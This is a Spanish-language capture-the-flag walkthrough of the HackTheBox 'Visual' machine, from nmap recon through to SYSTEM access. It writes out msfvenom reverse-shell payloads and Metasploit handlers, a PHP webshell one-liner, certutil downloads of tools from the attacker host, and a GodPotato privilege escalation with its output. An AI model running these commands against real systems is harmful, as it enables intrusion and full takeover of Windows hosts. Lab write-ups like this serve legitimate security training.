---
title: "Visual Write-Up - HackTheBox"
description: "Visual Write-Up - HackTheBox"
pubDatetime: 2023-10-07
tags:
  ["media", "htb", "msbuild", "git hosting", "service account", "impersonating"]
---

# Reconocimiento

Para comenzar lanzamos un escaneo de puertos con nmap.

```bash
# Nmap 7.94 scan initiated Sun Oct  1 02:57:50 2023 as: nmap -A -p80 -oN target 10.10.11.234
Nmap scan report for 10.10.11.234
Host is up (0.098s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.1.17)
|_http-title: Visual - Revolutionizing Visual Studio Builds
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.1.17
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019 (86%)
Aggressive OS guesses: Microsoft Windows Server 2019 (86%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   106.76 ms 10.10.14.1
2   108.31 ms 10.10.11.234

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Oct  1 02:58:08 2023 -- 1 IP address (1 host up) scanned in 18.56 seconds
```

De primeras solo encontramos un puerto abierto por TCP, el puerto 80.

## Reconocimiento web

En este corre el siguiente servicio web:

![](@assets/HackTheBox/Visual/index.png)

En este podemos indicar una dirección URL que aloje algún proyecto y el servicio compilará programas escritos en **.NET 6.0** y en **C#**, devolviendo los ejecutables o DLL generados.

![](@assets/HackTheBox/Visual/submit.png)

Al mandar cualquier URL que no contenga nada, devuelve que el repositorio no contiene un archivo `.sln`.

![](@assets/HackTheBox/Visual/sln.png)

Por lo que sospecho que por detrás estará usando **MSBuild** o algo por el estilo para compilar programas.

Encontré este artículo donde explica como obtener RCE a través de MSBuild.

- [https://www.hackingarticles.in/windows-exploitation-msbuild/](https://www.hackingarticles.in/windows-exploitation-msbuilg/)

Pero primero, para que nos reconozca la URL, me monto un servidor con GOGS para hostear el repositorio.

El setup es muy simple, te instalas gogs e inicializas el servicio, estará hosteando un servicio web por el puerto 3000 donde puedes configurar la base de datos, etc.

> La documentación y pasos de instalación se encuentran en [https://gogs.io/docs](https://gogs.io/docs)

![](@assets/HackTheBox/Visual/gogs.png)

Una vez seteado podemos crear el primer repositorio, para eso simplemente en una carpeta local corremos los siguientes comandos:

```bash
❯ touch README.md
❯ git add .
❯ git remote add origin http://localhost:3000/ziox/exploit.git
❯ git checkout -b master
❯ git commit -m "initial commit"
❯ git push origin master
```

Una vez creado podemos crear el projecto donde estará nuestro exploit.

```bash
❯ dotnet new console -n rce
❯ dotnet new sln -n rce
❯ dotnet sln add rce.csproj
```

Hay que reemplazar el archivo `.csproj` por este: [https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20shellcode.xml](https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20shellcode.xml)

Y cambiar el payload (shellcode) que generaremos usando msfvenom:

```bash
❯ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.16 LPORT=443 -f csharp
```

Lo demás se puede dejar por defecto.

Esta es la URL que tendremos que mandar a la máquina víctima.

![](@assets/HackTheBox/Visual/exploit.png)

Nos ponemos en escucha con msfconsole:

```bash
❯ sudo msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost tun0; set lport 443; run"
[*] Using configured payload generic/shell_reverse_tcp
payload => windows/meterpreter/reverse_tcp
lhost => tun0
lport => 443
[*] Started reverse TCP handler on 10.10.14.16:443
```

Mandamos la URL, y al cabo de un rato, recibimos una conexión:

![](@assets/HackTheBox/Visual/msfconsole.png)

Pero esta conexión dura unos segundos y luego se cierra, por lo que hay que buscar otra forma.

Usaré el módulo `multi/script/web_delivery` para obtener una conexión más estable.

Primero cargo el módulo para que me indice el one-liner de powershell que tengo que correr en la máquina víctima para obtener una session en meterpreter

```bash
❯ sudo msfconsole -q -x "use exploit/multi/script/web_delivery; set payload windows/meterpreter/reverse_tcp; set srvhost tun0; set lhost tun0; set target 2;run"
```

Luego en otra terminal me pongo en escucha como antes:

```bash
❯ sudo msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost tun0; set lport 443; set autorunscript 'load powershell'; run"
```

pero esta vez, antes de que la conexión muera, cargo powershell con `load powershell`, inicializo una powershell con `powershell_shell` y copio y pego el comando que el anterior módulo me indicó:

![](@assets/HackTheBox/Visual/powershell.png)

Y recibimos la sesión en la otra terminal:

![](@assets/HackTheBox/Visual/web.png)

Ahora tenemos una sesión estable en la que podemos explorar cómodamente el sistema.

Encuentro el directorio donde se encuentran los archivos del servidor web y tengo permisos de escritura, por lo que creo una webshell en php.

![](@assets/HackTheBox/Visual/dir.png)

```cmd
c:\xampp\htdocs>echo ^<?php system($_GET['cmd']);?^> > new.php
```

![](@assets/HackTheBox/Visual/webshell.png)

Vemos que ejecutamos comandos como **nt authority\local service**

Puedo subir la siguiente reverse shell escrita en PHP para ganar acceso desde nuestra máquina:

- [https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell_older.php](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell_older.php)

![](@assets/HackTheBox/Visual/whoami.png)

Al ser una cuenta de servicio, podemos intentar usar el siguiente exploit:

- [https://github.com/itm4n/FullPowers](https://github.com/itm4n/FullPowers)

Este sirve para recuperar privilegios (incluido el querido **SeImpersonate**) de [cuentas de servicio](https://learn.microsoft.com/es-es/windows-server/identity/ad-ds/manage/understand-service-accounts) las cuales por defecto tienen muchos de sus permisos limitados por seguridad.

![](@assets/HackTheBox/Visual/upgrade.png)

Para explotar el **SeImpersonatePrivilege**, como el servidor no corre ningún servicio SMB, estaré utilizando el siguiente exploit en vez del clásico PrintSpoofer o RoguePotato:

- [https://github.com/BeichenDream/GodPotato/releases/tag/V1.20](https://github.com/BeichenDream/GodPotato/releases/tag/V1.20)

```bash
c:\xampp\htdocs>certutil -urlcache -f http://10.10.14.16/GodPotato-NET4.exe GodPotato-NET4.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.

c:\xampp\htdocs>.\GodPotato-NET4.exe

    FFFFF                   FFF  FFFFFFF
   FFFFFFF                  FFF  FFFFFFFF
  FFF  FFFF                 FFF  FFF   FFF             FFF                  FFF
  FFF   FFF                 FFF  FFF   FFF             FFF                  FFF
  FFF   FFF                 FFF  FFF   FFF             FFF                  FFF
 FFFF        FFFFFFF   FFFFFFFF  FFF   FFF  FFFFFFF  FFFFFFFFF   FFFFFF  FFFFFFFFF    FFFFFF
 FFFF       FFFF FFFF  FFF FFFF  FFF  FFFF FFFF FFFF   FFF      FFF  FFF    FFF      FFF FFFF
 FFFF FFFFF FFF   FFF FFF   FFF  FFFFFFFF  FFF   FFF   FFF      F    FFF    FFF     FFF   FFF
 FFFF   FFF FFF   FFFFFFF   FFF  FFF      FFFF   FFF   FFF         FFFFF    FFF     FFF   FFFF
 FFFF   FFF FFF   FFFFFFF   FFF  FFF      FFFF   FFF   FFF      FFFFFFFF    FFF     FFF   FFFF
  FFF   FFF FFF   FFF FFF   FFF  FFF       FFF   FFF   FFF     FFFF  FFF    FFF     FFF   FFFF
  FFFF FFFF FFFF  FFF FFFF  FFF  FFF       FFF  FFFF   FFF     FFFF  FFF    FFF     FFFF  FFF
   FFFFFFFF  FFFFFFF   FFFFFFFF  FFF        FFFFFFF     FFFFFF  FFFFFFFF    FFFFFFF  FFFFFFF
    FFFFFFF   FFFFF     FFFFFFF  FFF         FFFFF       FFFFF   FFFFFFFF     FFFF     FFFF


Arguments:

	-cmd Required:True CommandLine (default cmd /c whoami)

Example:

GodPotato -cmd "cmd /c whoami"
GodPotato -cmd "cmd /c whoami"


c:\xampp\htdocs>.\GodPotato-NET4.exe -cmd "cmd /c whoami"
[*] CombaseModule: 0x140708649762816
[*] DispatchTable: 0x140708652068976
[*] UseProtseqFunction: 0x140708651445152
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] Trigger RPCSS
[*] CreateNamedPipe \\.\pipe\b6d9d945-848f-4080-ac4d-c4b0d89fb1fd\pipe\epmapper
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 0000dc02-13d8-ffff-72d8-3246f7d401c5
[*] DCOM obj OXID: 0x748efe1457c81df0
[*] DCOM obj OID: 0xc098342ea791c384
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 852 Token:0x808  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 1456
nt authority\system
```

Tenemos ejecución como **system**, solo nos falta ganar acceso con una consola interactiva.

Para ello transfiero un binario estático de ncat para mandarme una shell como **system**.

```cmd
c:\xampp\htdocs\uploads>certutil -urlcache -f http://10.10.14.16/ncat.exe ncat.exe
certutil -urlcache -f http://10.10.14.16/ncat.exe ncat.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
```

![](@assets/HackTheBox/Visual/ncat.png)

![](@assets/HackTheBox/Visual/root.png)

Happy Hacking!
